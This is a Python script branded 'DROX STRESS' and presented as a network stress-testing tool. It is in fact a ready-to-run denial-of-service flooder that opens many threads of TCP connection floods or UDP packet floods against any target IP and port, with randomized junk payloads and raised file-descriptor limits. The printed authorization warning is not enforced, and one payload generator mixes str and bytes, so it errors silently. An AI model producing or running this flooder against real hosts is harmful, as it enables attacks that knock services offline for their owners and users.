import socket
import threading
import time
import random
import logging
import os
import sys
import resource
from argparse import ArgumentParser

# Configure logging
logging.basicConfig(
    filename='stress_test.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filemode='w'
)

# Global stats tracking
CONNECTIONS_MADE = 0
ERROR_COUNT = 0

def display_banner():
    """Display enhanced ASCII banner"""
    banner = r"""
    ██████╗ ██████╗  ██████╗ ██╗  ██╗    ███████╗████████╗██████╗ ███████╗███████╗
    ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝
    ██║  ██║██████╔╝██║   ██║ ╚███╔╝     █████╗     ██║   ██████╔╝█████╗  ███████╗
    ██║  ██║██╔══██╗██║   ██║ ██╔██╗     ██╔══╝     ██║   ██╔══██╗██╔══╝  ╚════██║
    ██████╔╝██║  ██║╚██████╔╝██╔╝ ██╗    ███████╗   ██║   ██║  ██║███████╗███████║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
    """
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)

def increase_limits():
    """Increase system resource limits"""
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
    except:
        pass

def generate_payload():
    """Generate randomized traffic patterns"""
    payload_types = [
        lambda: b"GET /" + str(random.randint(0, 10000)).encode() + b" HTTP/1.1\r\nHost: " + socket.inet_ntoa(bytes(random.randint(0, 255) for _ in range(4))) + b"\r\n\r\n",
        lambda: os.urandom(random.randint(1024, 4096)),
        lambda: b"X" * random.randint(2048, 8192)
    ]
    return random.choice(payload_types)()

def tcp_flood(target_ip, target_port, duration):
    """Advanced TCP flood with socket persistence"""
    global CONNECTIONS_MADE, ERROR_COUNT
    end_time = time.time() + duration
    sockets = []

    try:
        while time.time() < end_time:
            try:
                # Create multiple sockets per iteration
                for _ in range(random.randint(1, 5)):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    sockets.append(s)
                    CONNECTIONS_MADE += 1

                # Send data through all open sockets
                for s in sockets:
                    try:
                        s.sendall(generate_payload())
                        time.sleep(random.uniform(0.01, 0.1))
                    except:
                        pass

            except Exception as e:
                ERROR_COUNT += 1
                logging.error(f"TCP Error: {str(e)}")
            
            finally:
                # Randomly close some sockets
                while len(sockets) > random.randint(5, 15):
                    s = sockets.pop()
                    s.close()

    except KeyboardInterrupt:
        pass
    finally:
        for s in sockets:
            try:
                s.close()
            except:
                pass

def udp_flood(target_ip, target_port, duration):
    """UDP flood attack"""
    global CONNECTIONS_MADE, ERROR_COUNT
    end_time = time.time() + duration
    
    try:
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(os.urandom(random.randint(1024, 65500)), (target_ip, target_port))
                CONNECTIONS_MADE += 1
                time.sleep(0.001)
            except Exception as e:
                ERROR_COUNT += 1
                logging.error(f"UDP Error: {str(e)}")
            finally:
                try:
                    s.close()
                except:
                    pass
    except KeyboardInterrupt:
        pass

def print_stats(duration):
    """Display real-time statistics"""
    start_time = time.time()
    last_update = start_time
    
    while time.time() - start_time < duration:
        time.sleep(0.5)
        if time.time() - last_update >= 1:
            print(f"\r[+] Connections: {CONNECTIONS_MADE} | Errors: {ERROR_COUNT} | Rate: {CONNECTIONS_MADE//int(time.time()-start_time+1)}/s", end="")
            last_update = time.time()

def start_stress_test(target_ip, target_port, num_threads, duration, mode):
    """Launch the stress test"""
    increase_limits()
    display_banner()
    
    print(f"""
    [ AGGRESSIVE STRESS TEST CONFIGURATION ]
    Target: {target_ip}:{target_port}
    Threads: {num_threads}
    Duration: {duration}s
    Mode: {mode}
    """)

    stats_thread = threading.Thread(target=print_stats, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()

    attack_func = tcp_flood if mode == 'tcp' else udp_flood
    threads = []

    try:
        for _ in range(num_threads):
            thread = threading.Thread(
                target=attack_func,
                args=(target_ip, target_port, duration)
            )
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print("\n[!] Test aborted by user")
    finally:
        print("\n[+] Test summary:")
        print(f"Total connections attempted: {CONNECTIONS_MADE}")
        print(f"Errors encountered: {ERROR_COUNT}")

def validate_args(args):
    """Validate command-line arguments"""
    try:
        socket.inet_aton(args.ip)
        if not (1 <= args.port <= 65535):
            raise ValueError("Invalid port number")
        if args.threads > 500:
            print("[!] Warning: High thread count may destabilize your system")
        return True
    except socket.error:
        print("Invalid IP address format")
        return False

if __name__ == "__main__":
    parser = ArgumentParser(description="Network Stress Testing Tool")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (max 500)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Test duration in seconds")
    parser.add_argument("-m", "--mode", choices=['tcp', 'udp'], default='tcp', help="Attack mode")

    args = parser.parse_args()
    
    if not validate_args(args):
        sys.exit(1)

    print("[!] WARNING: This will generate intense network traffic!")
    print("[!] Ensure you have proper authorization before continuing!")
    input("Press Enter to start or Ctrl+C to abort...")

    try:
        start_stress_test(
            args.ip,
            args.port,
            min(args.threads, 500),
            args.duration,
            args.mode
        )
    except Exception as e:
        print(f"Critical error: {str(e)}")
        sys.exit(1)
